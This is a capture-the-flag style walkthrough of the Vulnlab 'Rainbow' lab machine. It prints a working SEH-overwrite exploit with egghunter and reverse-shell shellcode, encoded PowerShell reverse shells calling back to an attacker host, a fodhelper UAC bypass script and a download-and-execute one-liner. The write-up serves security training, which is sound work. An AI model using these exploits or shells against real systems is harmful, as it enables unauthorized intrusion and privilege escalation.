---
categories:
- Vulnlab
image:
  path: vl_rainbow.png
layout: post
media_subpath: /assets/posts/2022-01-16-lab-rainbow-walkthrough
tags:
- binary exploitation
- vulnlab
- windows
title: Lab - Rainbow Walkthrough
---

Rainbow is a medium difficulty machine that involves a SEH-based buffer overflow for user and a UAC bypass for root.

## User

```
PORT     STATE SERVICE
21/tcp   open  ftp
80/tcp   open  http
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server
5357/tcp open  wsdapi
8080/tcp open  http-proxy
```

Anonymous FTP access allows to download the webserver binary running on port 8080. We also see a restart script which shows us that this webserver will automatically restart when it crashes. That leads us into the direction of exploring how to crash & exploit the binary.

**Finding the vulnerability**

This binary can be tricky to reverse because it was written in C++ and contains some compiler optimizations. The easiest way to check for vulnerabilities is to fuzz different inputs, e.g. fields of our request. This can be done by hand with curl or burp and will eventually lead to the crash condition: Large post requests lead to memory corruption.

This finally leads to the following PoC:

```python
#!/usr/bin/python
from pwn import *
from urllib import parse
from time import sleep
from sys import argv,exit
from os import system
 
HOST = b"10.10.10.10"
PORT = 8080

buffer = b"A"*900
content = buffer
payload =  b"POST / HTTP/1.1\r\n"
payload += b"Host: %s\r\n" % HOST
payload += b"Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0\r\n"
payload += b"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n"
payload += b"Content-Type: application/x-www-form-urlencoded\r\n"
payload += b"Content-Length: %d\r\n\r\n" % len(content)
payload += content
 
p = remote(HOST, PORT)
p.send(payload)
p.close()
```

**Binary exploit**

To develop the exploit, we follow the "standard" SEH-overwrite methodology:

1. Find offsets of our SEH/NSEH overwrites by sending a pattern
2. Find a POP-POP-RET gadget to use for the SEH field
3. Construct a short jump to use for the NSEH field
4. Watch stack to see how much space we have, where our payload has to be etc.
5. Use egghunter when only limited space available
6. Generate shellcode with msfvenom

A detailed video explanation of a similar exploit can be found in my UT99 & Kevin walkthroughs. Here are the most important commands for quick reference:

```
# load mona into windbg
.load pykd.pyd 

# patterns
!py mona pattern_create 900
!py mona pattern_offset <value>

# display exception handler
!exchain

# find pop pop ret gadget
!py mona seh

# short jump opcodes
msf-nasm_shell
nasm > jmp $+0xxx
00000000  EB80              jmp short 0xxx

# egghunter
!py mona egg -wow64 -winver 10

# msfvenom
msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp -b "\x00\x0a\x0d" LHOST=10.8.0.2 LPORT=443 -f  python
```

**Final exploit**

```python
#!/usr/bin/python
from pwn import *

HOST = b"10.10.10.10"
PORT = 8080

egghunter = b"\x42\x33\xd2\x66\x81\xca\xff\x0f\x33\xdb\x42\x53\x53\x52\x53\x53"
egghunter += b"\x53\x6a\x29\x58\xb3\xc0\x64\xff\x13\x83\xc4\x0c\x5a\x83\xc4\x08"
egghunter += b"\x3c\x05\x74\xdf\xb8\x77\x30\x30\x74\x8b\xfa\xaf\x75\xda\xaf\x75"
egghunter += b"\xd7\xff\xe7"

# msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp -b "\x00\x0a\x0d" LHOST=10.8.0.2 LPORT=443 -f  python
buf =  b""
buf += b"\xdb\xd5\xd9\x74\x24\xf4\xbe\x74\x6b\x24\x01\x5d\x29"
buf += b"\xc9\xb1\x52\x31\x75\x17\x03\x75\x17\x83\xb1\x6f\xc6"
buf += b"\xf4\xc5\x98\x84\xf7\x35\x59\xe9\x7e\xd0\x68\x29\xe4"
buf += b"\x91\xdb\x99\x6e\xf7\xd7\x52\x22\xe3\x6c\x16\xeb\x04"
buf += b"\xc4\x9d\xcd\x2b\xd5\x8e\x2e\x2a\x55\xcd\x62\x8c\x64"
buf += b"\x1e\x77\xcd\xa1\x43\x7a\x9f\x7a\x0f\x29\x0f\x0e\x45"
buf += b"\xf2\xa4\x5c\x4b\x72\x59\x14\x6a\x53\xcc\x2e\x35\x73"
buf += b"\xef\xe3\x4d\x3a\xf7\xe0\x68\xf4\x8c\xd3\x07\x07\x44"
buf += b"\x2a\xe7\xa4\xa9\x82\x1a\xb4\xee\x25\xc5\xc3\x06\x56"
buf += b"\x78\xd4\xdd\x24\xa6\x51\xc5\x8f\x2d\xc1\x21\x31\xe1"
buf += b"\x94\xa2\x3d\x4e\xd2\xec\x21\x51\x37\x87\x5e\xda\xb6"
buf += b"\x47\xd7\x98\x9c\x43\xb3\x7b\xbc\xd2\x19\x2d\xc1\x04"
buf += b"\xc2\x92\x67\x4f\xef\xc7\x15\x12\x78\x2b\x14\xac\x78"
buf += b"\x23\x2f\xdf\x4a\xec\x9b\x77\xe7\x65\x02\x80\x08\x5c"
buf += b"\xf2\x1e\xf7\x5f\x03\x37\x3c\x0b\x53\x2f\x95\x34\x38"
buf += b"\xaf\x1a\xe1\xef\xff\xb4\x5a\x50\xaf\x74\x0b\x38\xa5"
buf += b"\x7a\x74\x58\xc6\x50\x1d\xf3\x3d\x33\x28\x0c\x3d\xc1"
buf += b"\x44\x0e\x3d\xc4\x2f\x87\xdb\xac\x5f\xce\x74\x59\xf9"
buf += b"\x4b\x0e\xf8\x06\x46\x6b\x3a\x8c\x65\x8c\xf5\x65\x03"
buf += b"\x9e\x62\x86\x5e\xfc\x25\x99\x74\x68\xa9\x08\x13\x68"
buf += b"\xa4\x30\x8c\x3f\xe1\x87\xc5\xd5\x1f\xb1\x7f\xcb\xdd"
buf += b"\x27\x47\x4f\x3a\x94\x46\x4e\xcf\xa0\x6c\x40\x09\x28"
buf += b"\x29\x34\xc5\x7f\xe7\xe2\xa3\x29\x49\x5c\x7a\x85\x03"
buf += b"\x08\xfb\xe5\x93\x4e\x04\x20\x62\xae\xb5\x9d\x33\xd1"
buf += b"\x7a\x4a\xb4\xaa\x66\xea\x3b\x61\x23\x1a\x76\x2b\x02"
buf += b"\xb3\xdf\xbe\x16\xde\xdf\x15\x54\xe7\x63\x9f\x25\x1c"
buf += b"\x7b\xea\x20\x58\x3b\x07\x59\xf1\xae\x27\xce\xf2\xfa"
sc = buf

offset = 660

buffer = b"\x90"*10
buffer += b"w00tw00t"+sc
buffer += b"\x90"*200
buffer += egghunter
buffer += b"A"*(offset-len(buffer))
buffer += b"\xEB\x80\x90\x90" #nseh 
buffer += p32(0x004094d8) # pop ecx # pop ecx # ret
print(len(buffer))
buffer += b"D"*(900-len(buffer))
print(len(buffer))
content = buffer

payload =  b"POST / HTTP/1.1\r\n"
payload += b"Host: %s\r\n" % HOST
payload += b"Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0\r\n"
payload += b"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n"
payload += b"Content-Type: application/x-www-form-urlencoded\r\n"
payload += b"Content-Length: %d\r\n\r\n" % len(content)
payload += content
 
p = remote(HOST, PORT)
p.send(payload)
p.recvline()
p.close()
```

The exploit might take 3-4 tries until it works.

## Root

Our initial user is in the administrators group. This means all we have to do is to bypass UAC in order to get full privileges.

```
whoami /all

...
BUILTIN\Administrators                                        Alias            S-1-5-32-544 Group used for deny only
...

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

 Since rainbow.exe is a 32-bit binary, we are in a 32-bit shell which can make things a bit more tricky. In order to get a 64-bit shell, we can run a powershell reverse shell from sysnative:

```
C:\Windows\sysnative\WindowsPowerShell\v1.0\powershell.exe -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AOAAuADAALgAyACIALAA0ADQAMwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgA+AF8AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==
```

From this shell, we now use the common "fodhelper" UAC bypass.

fod.ps1:

```
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -exec bypass -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AOAAuADAALgAyACIALAA0ADQAMwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgA+AF8AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==" -Force

Start-Process "C:\Windows\system32\fodhelper.exe" -WindowStyle Hidden
```

Now we download & execute the script, leading to a reverse shell with full privileges:

```
iex(iwr http://10.8.0.2/fod.ps1 -usebasicparsing)
```

This allows us to read the root flag & finish this box.